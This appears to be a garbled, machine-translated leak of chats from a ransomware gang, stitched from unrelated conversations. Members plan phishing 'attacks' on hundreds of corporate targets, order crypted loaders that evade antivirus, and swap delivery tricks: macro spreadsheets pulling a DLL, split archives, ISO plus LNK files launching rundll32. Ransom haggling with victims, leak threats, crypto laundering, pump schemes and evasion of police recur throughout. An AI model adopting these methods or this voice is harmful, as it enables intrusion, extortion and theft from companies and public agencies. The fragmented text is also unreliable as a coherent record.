pancake. I wanted to bet 30 bucks today. Just like a probe, see the movement in your protocols. When it hits the exchange, when the order is executed.
And it's interesting when the multiplier on this listing reached x6000, how much would I sell these 10 contracts for?
well, let 400 be x100
Well, how much in the end?
therefore, I must be kept closer to the turnover of capital
not for how much. I haven't set production yet. I watch .. I have
So far, only telegrams confidently scan and scrape the Binance news site.
yeah, that's not what you're doing :)
And issuing a warrant is a single action. Do not fig do do. But you need to figure out the timing. I guess him
This is a hobby
I just told you about this listing. You don't have any information about what's going on. How the organizers distribute bullshit for a penny, how then a small crowd of 500 slots comes to trade, how it all plunges into the exchange.
well
it's a harsh world
who got up earlier and slippers ..
https://trade.kucoin.com/SOLR-USDT
here for illustration
it's not about the masters of the world to rush, but to be there at every leap.
And to know that it is always easy and legal to take (as much as you like)
According to su chi, observe the fight, and not participate
but I would take part in the blockchain too. The theme is fire. Frantir!
Dex and all. Games, information systems
I find it funny when politicians discuss how Swift will break us off and how difficult it is to import it. What is there for a long time payments are expensive. Do they have any programmers to recommend at all?
certainly
units of smart sensible guys
the rest are more sticky
and adult guys are sitting there and turning with ahuiards) dialects to develop the industry .. so what should be done
It seems to me that politicians and bosses are not turning anything around.
if you want to participate, write a report on some topic that is close to you, why it is, what are the prospects and how we can use it in the social network for darknet users)
Compared to bitcoin owners whales
they say what they will be told
well you are so smart
what is the forecast for november on cue ball/ether
therefore, there is a noise, then El Salvador passes the state, then China prohibits, then the savings coin appears.
october november
I generally do not care for the course. Because I have a major coin increase.
everything was decided by fat guys behind closed doors)))) we will only have to guess what will happen
The cue ball must be raised in proportion to the digital dollar.
well, everything in crypto is also dangerous
The rate fell, bought a cue ball, rose, sold what I bought on the drain.
But this is trading and investing.
Sucks.
\\ tomorrow they will take it away from you and what will you do
And you need to look for points where there is a run-off.
and withdraw from trusted guys)
It can be instant x, but the main thing is to be guaranteed
it is better to overpay a couple of percent, but not by yourself
They can take everything, even life
life is not to be taken
so far at this stage we have already discussed, this is an opportunity to work with people
with any quantity. If there are beats
well, nice) we'll deal with the beats
and they need to be raised. Not on the course but in operations.
I sleep bro
good night
Sppok of the night. There will be cases, I will be the first to you
one is bored
+
I'm sorry, I'm last
no need to think about how to withdraw. Let it grow!

I do not believe in ransome in great results

that will give big wins

general
and what makes the brain work
I've been thinking
here we earned 1-10-50k
does not matter
and the brain is used to earning so much
it was clear what to do
for the money received
and what schemes to do
and so for years
decades
different periods different situations
offline for many years
then online with you
and then life abruptly gives opportunities
everything adds up
and money becomes xxxxxxxxxxxxx
and then situations and events
which multiply them to xxxxxxxxxxxxxxxxxxxxxxxxx
and you seem to be reflecting on the past
past schemes
but logically understand
what to go back to 1-10-50k schemes
it's a regression
and your brain is fucking new and does not know anything
what to do
and your universe collapses

they understand that life is not lived in vain

he said that he did not understand a little what was happening
and you bought a watch and don\u2019t understand why you need it
because you don't give a fuck about those who say what a cool watch
in your life it will not get better or worse
here is my question in the note
Is it possible to move on somewhere?
having no environment
who understands what they are talking about
and what happens in your life))
and motion vectors
really not))
or is it all on old schemes
schemes
or he is on new schemes, where the same people are gathered, with the same questions that I raised and have already found answers there perhaps)))

Hey\nHearing, and you a case with a sphinx did not work?\nOr with other search engines?
hi but i have been working with mnogosearch tightly
sphinx set up for site search
but that was 7 years ago
that is, there were still old versions

but it\u2019s easier to search there, it plows through a spider
Yes, I can\u2019t solve the problem with this sphinx, I have already climbed all the forums and asked everyone I could\nThere is, roughly speaking, a yurl, and for a piece of a yurl, he is not looking for anything to do.\nEscaping doesn't help, changing the format of fields and index too

hi me, for now we pause the access!
I rolled out a patcher yesterday
throw off the accounts
That's good, I'll be able to see later\nAnd what about the patches for those tasks?
cooking
Filled up too?
seems to be all right
Ok, there you have another small task to change the width of the field, and there is nothing more in the plan this week.\nIt's cool that you came up with a patcher
yes i saw
I'll try to finish the sprint on time
You'll do well, no next week means. Let's talk about what to do next
I try to make the job easier
)
engineers are lazy people
I somehow worked as a cryptor, and every day I crypted the software, but I got so sick of it that I wrote a polymorphic autocrypt, which was clean for almost 6 months, but I just watched movies)
Hey)
listen, please give me the firm with which the first person failed
:) Cool experience\nIn fact, a good job is when everything works stably
And not when people are powerless and in a rage.
this should be striven for
Agree.
and here, too, you need to put things in order
I looked that everything how the demons work
This is not good
and then I changed the laptop, lost the company

Hey
I ask you not to touch Dave until Wednesday
until he decides everything with the land
let him join the process
and if not, then fine
everyone understands that I fell from the sky on your head
everything will come out, then operators will overwhelm you with loads
decide among yourselves plz
it seems to me that I will have to disappear for a week or not, my deputy is here if anything happens to the operators
notes under the door, under the windshield, they want to talk, comrades say not to twitch and decide after the fact
so it\u2019s with you, but you need to understand whether it\u2019s worth it or not for your productive work, and without the work of the landing and the entire chain, you won\u2019t understand this
Yes
work, we'll see
everything sounds like a plan to action
what I was warned about
OK
I want to avoid hassle for a few months
and for this you need to go to rest to you with the whole team
wonder when they run out of patience
wait and see
this week maybe there will be loads, or maybe not\nlet's try to get back to work

on the subject of loads
booza tells dave everything is ready
dave says you're in a mess
no one can make a server and configure
gave 3 people on servers
and all the arrows translate
everything stretches
booza says no dave
dave says he does everything and how he releases landing pages for operators
then already from the side of encoders a mess and servers here
generally as usual
gecnm j
I don't see him in the rocket
mess, no one is responsible for anything, etc.
let him contact me, let's exchange contacts
I will solve all problems with switchmen
I will make an important remark
everyone is busy with their tasks, they are used to doing what they did and everyone redelegates to another)
So how are they going to figure it all out?
then the operators will start calling
when it's not clear
wait another week
[15:08:02] <buza> let him contact me, exchange contacts\n[15:08:08] <buza> I will solve all the problems with switchmen
buza handsome
just objectively
mess
as soon as all issues are resolved, then let's start, my guys are ready to mine objects\nuntil the tool for issuing exe is ready
ask dave to contact buza urgently buza <buza@q3mcco35auwcstmt.onion/Psi+>

then the mess is worse than it was before
it doesn't stop me from making money
and you are handsome
build such a structure

We'll see
the rest need to be kicked)))

We made a landing and tested it on a dedik. Everything worked, there were no detections.
Hello.
We made a landing and tested it on a dedik. Everything worked, there were no detections.
Hey
give access to the server
where you can watch it live
from it go to land
and see
and to issue a working exe
with working def
and cloud
today
will you do it by 1900?
attack on wednesday
the current is necessary for the land to hang somewhere + there is a spare land to quickly transfer it to operators
if they fuck
first
organize until Wednesday?
if at 1900 they let me test myself to learn the landing\neverything works\nand by the environment different loader crypts will be ready for work and trick\nthen on Wednesday we will start the attacks from 11 am to 18 30\nbut most likely even on Thursday\n\ndecide when everyone can be here so that if anything, correct everything on the spot\nwell, without your presence, the Bentley will not cope here in the bustle of booze)) for the first time for sure\n\nyou need clean loaders from the deploy pack to put them in the landing\nlanding pages + spare on another host have azur or amazon
in advance for Wednesday, operators will prepare objects today
separately
access to crunchbase is needed
hunter.io access
datavalidation needed
accessibility
2 microsoft servers working access with AMC installed there + activated licenses
4 rmta (you bought 2, buy 2 more for 10-20 pieces)
on Wednesday we work, the operators began to warm up the contacts
looking forward to the evening
Hey)
let's do)
will test again tomorrow)
and we will make a couple of ready-made versions tomorrow evening, I think
yeah
attack on wednesday
well or what
if everything is ok
))
Hey
Hey)
agreed)
fucked up wind and cold
gotta go somewhere warm
dank rainy and sad)))
5 years after transfer
and still not used to

or so))
))))))))
Yes
work, we'll see
everything sounds like a plan to action
what I was warned about
OK
I want to avoid hassle for a few months
and for this you need to go to rest to you with the whole team
wonder when they run out of patience
wait and see
damn the toad hung and I missed you (
https://privnote.com/FgxaA4ew#5Bw0Ms7Ve
write as you will, I will, as always, have a lot of questions)
this week maybe there will be loads, or maybe not\nlet's try to get back to work
on the subject of loads
booza tells dave everything is ready
no one can make a server and configure
gave 3 people on servers
dave says you're in a mess
and all the arrows translate
everything stretches
booza says no dave
then already from the side of encoders a mess and servers here
dave says he does everything and how he releases landing pages for operators
I will make an important remark
generally as usual
everyone is busy with their tasks, they are used to doing what they did and everyone redelegates to another)
mess, no one is responsible for anything, etc.
when it's not clear
So how are they going to figure it all out?
wait another week
then the operators will start calling
just objectively
buza handsome
mess
as soon as all issues are resolved, then we will start, my guys are ready to mine objects\nuntil the tool for issuing exe is ready
[15:08:02] <buza> let him contact me, exchange contacts\n[15:08:08] <buza> I will solve all the problems with switchmen
if interesting
then here the mess is worse than it was before
and you are handsome
it doesn't stop me from making money
build such a structure
Buza took over the decision as quickly as possible)
but it all depends on a couple of people
We'll see
the rest need to be kicked)))
but it is not exactly)
2 weeks with the servers to decide what kind of PPC))
[15:19:01] <buza> as soon as we start communicating with you, the connection is immediately established everywhere, all channels\n[15:19:10] <buza> rocket tox this toad\n[15:19:41] <blood> hahaha\n[15:19:52] <buza> once again\n[15:19:56] <blood> Khors already told me that the universe is fucking around)))\n[15:20:09] <blood> he has the same story))) all the channels are constantly down))) ahhaha
HAHAHAHA
and this
stern))
just in case))
Buza is trying hard, everyone is fussing around, someone is not there, someone is))
no more nerves
everything is going as it should

In general, let's do this. I missed something during the year that I was busy in real life, but I also have some base. We can try to find intersections for mutual benefit
\n\"[19:08:15] <rozteka> I doc for a very long time can not find who will do\nthere is a dock
None, but it works
doc def bypasses?
Yes, sure. The most important criterion
We used to be better, but this person is no longer in the subject. To what is - there are also questions, but still it works and is clean enough
Previously, my loader and dock were also full of twitter
Ostap loader was like this
<Hash> Now I'm starting to indulge in web soap, there is a link implementation from google drive\n[19:10:28] <Hash> But I absolutely don't know shit about it
Is there anyone to consult?
formulate a question
Link to drive. What is posted there? Archive / bare attachment? Link one or generate a bunch at once?
judging by what i did yesterday
archive
It doesn't matter which drive (google/onedrive)
on winddrive i can tell
all this is essentially for the chromium bypass, it seems to work
so that there was no alert and the download fell immediately
in a folder on the machine to the victim
Yes, most likely so
\n\u00bb Link one or generate a bunch at once?\nmb automatizers are. on some kind of zennoPoster or on the forum or leave it on order. didn't see it myself
there is an uploader on one drive
pay attention
on prometheus
on exp 200 is worth something
rocket fell
I will be very grateful to you if you help me collect the dock. what is required of me?
The only thing that confuses me is the archive. It's just that I saw better times when archives and other crap were not needed if there was a good dock. And in comparison with the dock, the archive with the same almost, but crappy dock gave less results
10 minutes, I'll be back, I'll tell you
I see\nthere is another cartoon you know what
Send archive
And in it, for example, .js
and you will be detected immediately by the extension
how to bypass? easily
Archive, and in it a cut archive into 2-3-4-5 parts (5-10 kilobytes each). opening the first one, the next ones are pulled up and already this passes on board the victim and the cloud analyzers are cut off. cool reception
Read more you know what to train the mind
Nobelium attack
on microsoft description. I'm from there taking with ISO + hidden DLL + LNK steal
stole*
\n\u00bb ISO + hidden DLL + LNK\nis it some kind of container?
Simply, there is such a proposal for an attachment. Let's call it \"container\". Didn't have time to evaluate.
There, too, ink appear
Yes. link to bypass smartscreen and run rundll32 1.dll
And as a result? Or is it already a way outdated?
so far I have this the most penetrating
I've been tech-savvy before
js vbs exe
In general, look, under the dock, or to be more precise, this is not a dock, but an xlsm table. You only need vps to post a dll. There is one problem with this hlsm - no protection. I can advise you to take black tds as anti-bot protection
js vbs still mb it makes sense to unwind, but you need someone who amsi bypasses
ok, that is, I need a domain from me and a file to the DLL, right?
what is the entry point?
Make any entry point. Just let me know if it differs from the standard
[Error: The message is encrypted and cannot be decrypted.]
OK. I will leave the domain with VPS in the order now
[Error: The message is encrypted and cannot be decrypted.]
Domain not needed
just link with ip
Well, you can also with a domain if you want :)
accepted. left in order
also look
Js we once used very much
https://securityintelligence.com/posts/trickbot-gang-doubles-down-enterprise-infection/
colleagues in the shop as spam. all tricks at once
In our dock, a js loader with a protection complex was packed
Well, there the protection complex was already against the fact that the payload itself did not go where it was not necessary
like checking processes, defining a snapbox?
Yes
Plus the definition of networks, the number of machines in the network, if it is not a single machine
Ah, network...
This was the same ostap loader
That is, on the loader we already had a clear idea of what and where to ship without all the dancing with a tambourine
is it not implemented now?
[Error: The message is encrypted and cannot be decrypted.]
[Error: The message is encrypted and cannot be decrypted.]
It can be implemented only if there is a specialist of the required level. There is no such encoder for 2 reasons. 1. At some point, we all quarreled. 2. The coder at some point realized that everything had gone too far and after reading a couple of three revelations showed a trick in the style of Bender Ostap - gone
What language do you need a coder for?
js
\n\u00bb The coder at some point realized that everything had gone too far\nhe didn't know what he was doing and was on salary for 1k a month right? :)
No, he knew and not for 1k :)
It's just that his cuffs start to tighten
what to fuck then it\u2019s not clear from us, we have top conditions IMHO
we use almost any volume
and no stitches
Well, the conditions are top, but everyone's nerves are different. We were 3 people in the team. 2 of them left for the above reason
One still appeared at the end of September, wrote something like \"everyone here is fucked under what kind of cap\" went somewhere off
Well, what can I say here? There is also such an opinion
maybe he had some insider :D
or dope I'm picky xs)
Yes, it seems like the type is normal and known long before the trick
Geez, what does he have there?
Maybe I saved up and thought enough
sec with net troubles
I will later study the links that you sent on the methods
Maybe I'll get something for myself
Greetings
Hey
How many copies of the docks do you need to make?
10 at the start
I usually multiply for myself with different hashes
1-3k
Alright, I'll do it, as you send the link tomorrow
However, I would still recommend protection.
Otherwise, there will be such a pile of slag that you can fucking
hello, what do you know about this guy?\nsent it to you\njoynses@thesecure.biz
[20:21:39] <Hash> And about the loader, an analogue of what we once had earlier. Here, not only the encoder for the loader is needed. There is also a need for a person who makes docks and understands how to \"wrap\" the same loader into the dock. The local docker does not have such capabilities.
I already learned everything there, as I began to return to work
So with this direction, I'm still in a stupor

besides those 2
10 there?

in every
did you order new ones?
I see everything
by rmta
it is necessary to flood the admins of the IT department
actually on wednesday today
operators call prepare everyone
we start on thursday
on wednesday i would like in the evening
test the work
and on thu
many crypt files
so that the working assemblies of the loader are
which can be substituted
to landing page
and 2 spare landings
1 and 2
and dave is here with booze
to control
from 12 am (Thursday)
until 1900
maybe?
agree with them plz
Hey
start on thursday
you need to have 1 working land and 1-2 spares on hand so that if anything they can be given to operators
if the first one gets fucked
or second
on Thurs at 12 00 start
and until 18 30
plz be here
and Wednesday today
check that there are spare
if you put them
so that the operators are not left with a dick
during work

talked to someone I know
has its pros and cons
there will be no life in yua
asked to move to Russia until mid-December
it will get worse here
suffer here for certain reasons for now
then they can decide otherwise in Kyiv
not everyone can control
hence the hints went with notes under the windshield
so in december
want to you
do you want to come
and settle down
ok it's not really important
trick turned out to be too toxic
fuck off
like on Thurs start on loads we will start work

let's work, and where life will lead
on the topic of a flight to Russia
clearly and clearly made it clear through whom he learned
november is ok
and since mid-December
it's better for you not to be here and your guys
if you don\u2019t want to immerse yourself in worries for months
like there won't be any consequences.
but it seems that the nerves will shake the sbu
who knows what they can do
those who set themselves the task
will drag the question of d. security
and wait for guests from Kyiv
in fact it will be easier
but they will give the case a go and create problems for months
so let's celebrate New Year's together
prepare gifts

Do you have a tracker?
technical director, a copy of the report to Max\n===================\n\nGmyla autoreg works, but they block the account, they write - it was created by the program\n\nusing tshark I record traffic without auto-registration and with auto-registration, I compare each packet, I analyze the difference in traffic, the volume of conversions is very large, these are things in a nutshell\n\nI did not throw off the git, everything is on the server\n\nI was skeptical with one Amer, persuaded him to hack Google, but he fell off a week later, got scared\n\nI think the difference in traffic and its decoding should give a positive result\n\nI brought the automation to a complete ideal, you just need to identify and \"bite out\" Google markers

Do you mind if I give you Kobs tomorrow? I have a crash process. it might just be a busy time
there is a nuance with domains
others are needed. took specially on the norms of the hoster.

I sit and think how can this be
sorry, turbulence
Hey
Make an acc on hitech plz
He will also recruit a group of admins for pentesters from me
Hey
crunchbase
accessibility
took?
give access to
we work on monday
operators warmed up only 200 contacts on objects
it is not enough
are accelerating
Friday to 500-800 will bring
everyone will be agreed on monday
gotta get into work mode
\n[03:42:31] <blood> we work on Mon\n[03:42:40] <blood> operators warmed up only 200 contacts on objects\n[03:42:42] <blood> is not enough\n[03:42:44] <blood> are accelerating\n[03:42:52] <blood> will be brought to 500-800 on Friday\n[03:42:58] <blood> everyone will agree on Mon\n[03:43:03] <blood> they need to join the working mode
Hey
OK)
just test everything again) \\\\
hahaha)))
are you tired of it?))
test
give Khorsa
about mon
work
let it get better
No))
although I want to see it in battle
Honestly)
do not worry
amers will have time
cover it all up
and here is the question
work hard for a week
let's see how they cover)
and fix everything
or smear)))
they covered everything)
I do not believe that it will not be covered in a month
yes they will cover it, of course\nThe question is how long will it take
with host
please decide
convinced that on the first day
face
with locks in a blacklist
domain
if he leaves you lie on the trust
one hundred%
ok, I'll take a look at the weekend
What are the options
thanks
maybe this option
and solve many
Problems
potential
yes and to be honest
no one fucked amers for a long time
on twitter about attack bodies
long time no mention
nowhere
and now it will be effective
close to two weeks
very
and then again briefings
planning meetings
training
brainwashing
regular mailings to everyone within the company
about the fact that the attacks are not communicating with anyone
global paranoia
and would not recline
smear everything
like let's set up a week
land
to have on hand
working version
I'm sure about operators
they then made thousands of loads targeted from 50 ml of rhubarb
before going on vacation made thousands
and they will do it right now
the current will join the rhythm
there is something to improve here, but we will make a test like this, if it works, we will already think about how to improve it and fuck even harder)
Okay
if on mon
lock in an hour
3 landings
they are all on different domains right?
and hosts
I don't think it's broken
yes, on different
but, just in case, over the weekend I'll think about how to do it
Do you know how much the bazaar is lochat for?
and otsuk under 0
goes
say?
3 minutes
booze will tell you
fucking cloud
so why do we still use the market?)
understand, do it yourself
why not another loader))
I'm not just asking
))
another wrote
Yes, I understand) I'll look at the weekend, for sure
pieces 10 of them
what are you up to?)
under spam
lives knocking
trick works ok
under spam
how it worked
))
it is worth taking a week for operators to work
any software is dismantled to zero
and you can throw it away
under targeted attacks
you never saw the time
did not find
when by day
not weeks
weeks to be exact
during the week
adopted the rules
by certificates
and software
different encoders
loaders wrote
different code
methods
only operators worked
in a week or two
could have been thrown away
and spammers
have been working for years
but they also have loads
almost shit
ok what to say
myself aware
if interested
how silly everyone is
to spam
yes, I looked and wondered)
and how not gray
on targeted systemic attacks
where nothing will ever be uploaded from spam
And How
do my words match the deeds?
and conclusions?
certainly)
well at least that
I was told
bazaar bullshit
don't fucking knock
thirty%
otsuk
in yus
from spam
well spammers are spammers
well, they also bring a penny
don't judge them
trike is better
you can also kobu directly
attack with her
tsuk will be better
than on a heaped loader
the coder of the trika is a genius of course)))
current sessions will fall off
and goodbye bot
in the loader at least there is a chance of life to reattach
if something fell
consequences of careless actions
higher chance
than directly
from a kob
but essentially
otsuk from the koba is the same as on the loader))
with point attacks
with one downside
he is taller
off session
and all
not return
is it true?
why?)))
many modules wrote booze for a trick
he also oversees all new loaders
from dozens of encoders
so the market is not such garbage comes out)
if you rely on your words)
or something doesn't fit)
I did not say that the market is garbage
I understand that he has his own jokes
both pros and cons
trick is a train
heavy
but rides on energy
and the bazaar
he was purely under the operators
then it was already issued to spammers
and loaded it
strongly
modules
knocked on the head
and the base made light versions
encoders
they were all killed
booze couldn't stand it
and said he wants to do something else
because everything is too nervous)
tired of the constant destruction
that all their thoughts
are destroyed)
oh yeah, it's demotivating
fuck when the wall you built for a week was broken in a couple of hours)
ended up crashing.)
)))
And what are the grandmas paying him for?))
and all people
he has spammers
like a breather))
let's work with them)
i said fuck you
and gave a break
now I ask you how
he says rested
thanks
I realized that it will be fucked up again
))))))))
says ready
hahaha
We'll see
it all depends
from your land
oh, it will be fun))
exactly block it in corp networks
I think we will solve with a block
correct host for this
and all
Well, how quickly do they figure it out?
how to mute it
firewalls or plugins
be here on saturday
plz
from 1300 to 1900
waiting for access to crunchbase
it is very important
worker
un registered
in rmta?
for stat
OK
almost 7 am
gotta get the baby
get ready for mon
already for sure
yes, I'm getting ready
200-400 people will be killed today
and there will be a total of 500-800 objects under attack
on mon
agreed
and there even 20% is already enough for everyone to work for you
))))
maybe there is no more hope
hahaa)
yes, it's the same math
shitty
on mon
need a trick
with clean domains
and bazaar
with clean domains NOT xyz and similar slag
even if there are 200 objects, dick understand how many will be alive, how much it will turn out, how much it will pay, and so on))
a .com
for otsuka
)) is it feasible?
trick needed 100%
to be on mon
worker
without it there will be no start
will not
there is no point in even thinking and counting something, somehow everything will go by itself))
we will distribute them with the bazaar to different groups of operators
and see what is better stuicht
piss off 800 objects + - I don\u2019t want to at all
and 10-20% will give a load of work to all hackers
targets from 50 ml of rhubarb to 90 billion

Hey
put it like this
systemically
work out
your plans, etc.
and then everything can go
And if not
there is always another option
and you lean
to previous experience
it's you in vain)
whined here one whined)
and ptom received a payment of 50 bitcoins
and said fuck
lottery)
began to fuck
I'm not in a bad way
gained strength)
and it went like that
I believe that everything will go)
here was the question
if I sent everything to the dog's dicks)
I'm just summarizing how it goes :)
everything will start - it will be fucked up)
Yes
I think yes
just not sure
in the host
I think everything will be broken quickly
in 10 minutes
Yes, I will decide with the host))
every island
and I think that the team with pure loaders
not ready
like pies right now
change them
in the landing
all strong
and the strongest crypter
but just forgot about the pace
but they will sway
during the week

You find there a folder with the id of the news, let's say iEJZz19l and upload it there
If it doesn't exist, you create it yourself.

hi there?
he big day has arrived. 24 hours remaining until the biggest pump signal of all time! The target this time will be around 400% gains possibly even more. We will be targeting 100 million $ volume. With the bull market being in full effect and volumes being high, the odds of reaching 400% profit will be very high once again. We will do everything in our power to make sure we reach this target, if you have missed our previous big successful pumps, this is also the one you will not want to miss. A massive pump is about to begin in only 24 hours, be prepared.

hi
gotovo
Damn, the bullshit started that some guys on the exchange are freezing grandmas and locking acc. 2 people have unsubscribed so far, I think not the last ...
one had to be reimbursed, the exchange cracked him and froze money for 3 months, they ask for a bunch of documents and an explanation of where the cue balls come from .. the other hasn\u2019t understood yet, but it seems they should just return the cue balls
Buran has 4 people so far, + 4 new Osints and 2 encoders.
Zp distributed almost everything, whom I could catch online, tomorrow I will finish all the tails and change wallets and systems in general, probably for everyone
again we are there in the news on securitylab ..

what is the error address?
put a bay on a new one
I think it will flood in the morning
then I will put everything
hello bro, tomorrow I'll be in touch, I'll sign everything
although no, there was a crooked raid on the server, I set it to be recreated, there nve 4 disks of 3841GB each, I recreate them in raid 10 so that the total storage is almost 8tb .. that is, 3841GB and 3841GB + 3841GB and 3841GB\n\nand there was essentially nothing there, I accidentally noticed when I loaded onto one of these disks that there were 3 more
the creation will take approximately 9-10 hours, in the morning I will put the bay, I changed the gaskets, there the speed will be more for the bay, I think it should be done in 4-5 hours

Hey
I\u2019m addicted now, I\u2019m interested in trading, defi, blockchain, new projects ... everywhere there is an exhaust. And how boring everything is. I'm sure you'll make your own there too. There is a big dream probably in this topic, I'm not sure that it is needed, but we will be useful to everyone. big companies have too many secrets that they hold on to, thinking that this is their main value, these patents and data.

Hello, I repeat, it's up to the 13th. In the morning it seemed to us that we were being followed, as unfamiliar cars were standing in the yard, two bodies were sitting in the car. In order not to substitute anyone, not you and not us. Dorirus and I decided to shut down for a week, all devices temporarily at headquarters. We'll be gone for about a week. It is better to play it safe, as our business has been extended until November 13th. By November 13, everything will be decided, we hope that the case will be stopped. Because there is nothing left to take from us. The only thing annoying is that the request from pendos for 4 Russians. I hope we are not on the list.)

I did not mean to step on your toes seems I did not get my message over to you. We do understand the consequences of the situation. That is why we want to negotiate a solution with you! All I was trying to deliver is the message that we are in a tough economic situation and simply cannot pay your demand. I have spoken to my management. They understand the situation and are willing to pay. The money we can afford is 500.000.00 USD. This is a huge amount for us. Please let us fix a deal.
here yesterday's guys drank to whom you wrote a larger letter
he Price to unlock is $2,000,000.
you need to raise them in price to 1.5kk at least

I don\u2019t get zp from semolina at all)

Hello. Everything is super good. But today we are watching. Run again your champion friend.
I have a lot of analytical work to build in.
Made a computer center to adjust the entire scheme. That is, he advanced in vital directions.
Network 1 gigabit, put 2 TB SSD. Tied up a LAN to a home network to automatically transfer the development to an industrial server.
With this configuration, we will quickly achieve results. Unfortunately, there was not enough energy for the routine of writing simple requests for placing limit or market orders.
On the other hand, I worked out the issue of retailing stop, when the stoploss follows closely behind the price growth and fixes only the final short pump.
This will allow you to significantly increase the percentage.

hello - we are going through the process of the committees required to make a decision in this case. as you know we are a government public transport agency and there is not a single person who can make a decision here. can you allow us a couple of extra days beyond the original 6 days you mention? also is there any more discount you can offer on the price because it changes how many decision makers need to approve.
what do they need to make
write back how you will explain again

Hey
hello, listen, hof is not at all interested, you need to connect someone instead of him, decide tomorrow who can replace him, better than one of the old ones, and take a new one in his place, in the sense that what hof did the new one should not do

Hey
with Rocco we are discussing the steps of otstuk bk
need to move faster to routers
we found good sellers, they give clean ips
you just need to make the IP transfer not in the headers but in the get request on the side of the bot and the backend, as in tr
in sotal everything will work immediately
come on, maybe tomorrow you will puzzle the coders too
now the final vps are knocking on the intermediate vps, which dives into the torus to the north
this is the weak link
glows thoroughly, this is unlikely to happen through rotaries
now the online has fallen again, I'm helping the script to make an auto-reboot of the torus on this intermediate

Okay

this is still the beginning
shcha
ready to read?

certainly
Do you really think that your information (more than 115 GB) is not worth that much money? Personal data of clients, financial statements of the company and so on are no longer interesting for DarkNet? I think you are wrong. But we can always check it by posting your information on the our blog and notifying Internet news agencies. I think the courts and competitors will quickly let you know about yourself.
well, drink up plz
or drunk)
no no
I like
Okay
OK
I'll talk to Trump

come
well xs
he throws a task at one in the morning and says you need to do it
well, how to be here?))
you need to do bro, otherwise they will throw me out and fucked me then
and then I first believed that dreams can come true
I immediately said that fuck I work from 3 to midnight)
when applying for a job
ahah
can bro
well, no one asked me, and secondly they said that they would look at me for now
right now you'll get shorter
pillow
well close everything here and there
yes I am trying
here look

you look
shorter
look
trump knows i'm not here forever
I'll fill a lam-2 bucks
and leave
you stay here
one
and if it goes like this you're fucking
yes, I know
but I hope we will change the condition
later
I also plan to fill so much and then maybe leave
I don't need much
yes, that's for sure
just the point is
I will formulate
when i fucked up like that
for days
I thought about quitting
right now, a little differently, I can leave whenever I want
I just want more butterflies
I think bro you won't quit
and then fucked up, when you sit the flask does not cook
shit doesn't grow
lam-2 you will fuck very fast
I'll throw
because I'm afraid
I have 2 children
and it's easier for me to have a pillow and business
yes you are not the only one
than to sit and risk
well that's right bro
you can't argue here
it is clear that opportunities give rise to needs
but damn
))
Just don't tell Trump
and then offended
ass is more expensive
yes he is aware
agree
I immediately said
I've been working with him for a very long time
ahah
before this thread
well, yes
he said
only now I didn\u2019t fool from where
and you know what's strange
ahah
I wrote letters to him
for 40-60 bucks a pack
when I wrote him an open toad
I was added to him)
and he's in awe of where
small world)
it's true
I even have solutions in the cart
okay bro, did you tell trump that I dashed off the letter?
we sent it already
Yes
certainly
maybe he didn't believe it?

how it all happens
?b
I just would like to fly to the seas in January
without laptop
well, you're a desperate kid
what else can i say :)
why?)
Well, it's up to you, of course, but I wouldn't fly abroad
not at all
you may not come)
in the wrong steppe
ahah
I understand perfectly well that yus and ey are everything
yt vjb dfhbfyns
and what about here
not my choices
they can pull from any country
well
from India from Turkey
[Error: The message is encrypted and cannot be decrypted.]
more than once it was
not the same countries
sit in Russia all your life now or what?)
well you fly faster
while there is still a chance
till
If all is well, I'll go too :)
ahah
I just don't risk
from the second I look roughly
January
I understand
Come on
understood
You definitely don't need to take a laptop with you.
here I am about the same
and clean the phone there too from the extravagant life)
I don't have anything on my phone
I don't use it
don't use a lot of coke, be safe with the girls :-D
ahah
fuck)
me with my wife)
XD
ju fuck
e yfc djn 10 ktn 11 xbckf ,skj)
we had 10 years on the 11th
))
beautiful
Congratulations
My wife is good too :)
Yes)
well look carefully
by itself
all the special services of the world are looking for us..
:)
that's why I'm flying empty
it doesn't mean anything at all
there you will get everything you need.
I hope while there is a possibility
in general, I'll write off the dates closer to the truth
How do I get a ticket
don't want to buy in advance
roughly on the spot
understood
this is a good solution
++
thanks for the alarm
I will be more careful
yes, try
if anything, of course, we will try to help somehow, but it is necessary that at least someone could contact me
at least a name so you know who to look for))
there is a person in the know
I'll warn you
Yes
well, people I worked with a grandmother
and flew like no problem
and still fly
ku

EVERYONE MUST DO THIS, otherwise the toad will stop working for you\n\nnew toad domain version 3\nodw5mdwotufuxxrgw3pvqjjuze3e33bylylkl667h4nefwiimwqsumyd.onion\n\nwe register it in the account settings - connection - server\nbefore that, on this tab, check the box Manually specify the server address and port\n\nport standard 5222\n\nIMPORTANT, everything else remains, the account lags behind with the old domain ... only the domain for connection is registered\n\n!!! How do you do, write me that everything is OK
hi hello how are you

Our contact person in Russia can confirm and explain that your attack seriously affects companies in Russia, which are very important for the local critical infrastructure.\nOur contact person can validate this for you.\nWe can make this contact available to you.
what do you think?
Hi Yes
bc1qptn5qsllcxmrndmwucelazjt0z68zkrgrlumy0
I made a new wallet, changed the OS too ..
[15:31:45] <mango> Will we drive it into the mixer? or pay as is, let them figure it out themselves?
new in general we have 9 people today
4 osints and 5 encoders
and separately there is also a tox team, whom the booze stirs up there, but I have only met 1 there so far
We didn\u2019t understand each other with lockbit ... You wrote that they need to put nets into work, he writes that he needs three at all) And under what conditions I didn\u2019t understand either, I gave him your contact here, he said he will write to you
[Error: The message is encrypted and cannot be decrypted.]
yeah
well, maybe he will then booze contact
on what conditions should he give three if something?
I wrote to him that we usually take part of the bots with nets, but I don\u2019t know which part))
say 20 percent
let's try there
20% of bots with nets are ours
OK
I'll be away for 20 minutes for procedures
OK
20 percent not bots but profits
let them do it themselves
by forum@ have you given him any nets yet?
gave him a pack of pulses, he couldn't do anything with them
I'll just try to shoot him nets
while I\u2019m sick, it\u2019s like this week, then they should let me go home ..
so I don't work very hard.
fuf gj
yeah got it
well pain
btc come, i will do everything soon
Yes
OK
I did not find a single Russian company that would cooperate with them, but perhaps there are some small ones, it would not be bad to understand which ones without their help. or what do you think?
sn gave, do not know?

Hey
I have a request for you. green has a problem with the host right now and can't pay my check. You can pay for 2 cobs: 1 server -101 $ (the second one is already paid). 2 pads - $20. 2 domains - 30 euros. It's all from Rocco. He just has problems with the system. and I'm wasting time while he solves the problem. Good?

that's right
Tell us how you are doing, what successes anyone has, maybe there are some ideas?
